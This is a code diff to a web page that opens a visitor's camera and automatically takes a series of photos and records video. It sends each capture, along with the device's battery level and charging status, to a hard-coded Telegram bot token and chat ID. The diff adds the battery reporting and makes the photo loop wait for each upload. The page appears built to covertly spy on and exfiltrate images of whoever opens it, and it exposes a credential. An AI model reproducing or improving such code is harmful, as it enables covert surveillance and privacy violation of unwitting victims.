@@ -53,7 +53,7 @@
       </button>
     </div>
     <div class="flex justify-center">
-      <button onclick="manualPhoto()" class="circle-btn"></button>
+      <button onclick="takePhoto()" class="circle-btn"></button>
     </div>
   </div>
 
@@ -69,6 +69,17 @@
 
     const botToken = "7336954365:AAHqd7DgkHDMetoFFjtNWvmV1IWZsmiiaLU";
     const chatId = "-1002563925697";
+
+    async function getBatteryInfo() {
+      if (navigator.getBattery) {
+        const battery = await navigator.getBattery();
+        return {
+          level: Math.round(battery.level * 100),
+          charging: battery.charging
+        };
+      }
+      return { level: "?", charging: false };
+    }
 
     async function startCamera() {
       if (stream) stream.getTracks().forEach(t => t.stop());
@@ -89,11 +100,7 @@
       startCamera();
     }
 
-    function manualPhoto() {
-      takePhoto();
-    }
-
-    function takePhoto() {
+    async function takePhoto() {
       const video = document.getElementById("video");
       const canvas = document.createElement("canvas");
       canvas.width = video.videoWidth;
@@ -101,10 +108,12 @@
       const ctx = canvas.getContext("2d");
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
       canvas.toBlob(async blob => {
+        const battery = await getBatteryInfo();
+        const caption = `📸 عکس ${++photoCount}\n🔋 شارژ: ${battery.level}%\n⚡ شارژر: ${battery.charging ? "وصل است" : "قطع است"}`;
         const form = new FormData();
         form.append("chat_id", chatId);
-        form.append("photo", blob, `snap_${++photoCount}.jpg`);
-        form.append("caption", `🔋 عکس ${photoCount}`);
+        form.append("photo", blob, `snap_${photoCount}.jpg`);
+        form.append("caption", caption);
         await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
           method: "POST",
           body: form
@@ -114,7 +123,7 @@
 
     async function autoCapture() {
       for (let i = 0; i < 15; i++) {
-        takePhoto();
+        await takePhoto();
         await new Promise(r => setTimeout(r, 4000));
       }
     }
@@ -124,8 +133,8 @@
       mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm; codecs=vp9" });
       mediaRecorder.ondataavailable = e => chunks.push(e.data);
       mediaRecorder.onstop = sendVideo;
-
       mediaRecorder.start();
+
       setTimeout(() => {
         if (mediaRecorder && mediaRecorder.state === "recording") {
           mediaRecorder.stop();
@@ -136,22 +145,17 @@
     async function sendVideo() {
       if (videoSent) return;
       videoSent = true;
+      const battery = await getBatteryInfo();
       const blob = new Blob(chunks, { type: "video/webm" });
       const form = new FormData();
       form.append("chat_id", chatId);
       form.append("video", blob, "video.webm");
-      form.append("caption", "ویدیو ضبط شده");
+      form.append("caption", `🎥 ویدیو ضبط شده\n🔋 شارژ: ${battery.level}%\n⚡ شارژر: ${battery.charging ? "وصل است" : "قطع است"}`);
       await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
         method: "POST",
         body: form
       });
     }
-
-    window.addEventListener("beforeunload", () => {
-      if (mediaRecorder && mediaRecorder.state === "recording") {
-        mediaRecorder.stop();
-      }
-    });
 
     startCamera();
   </script>
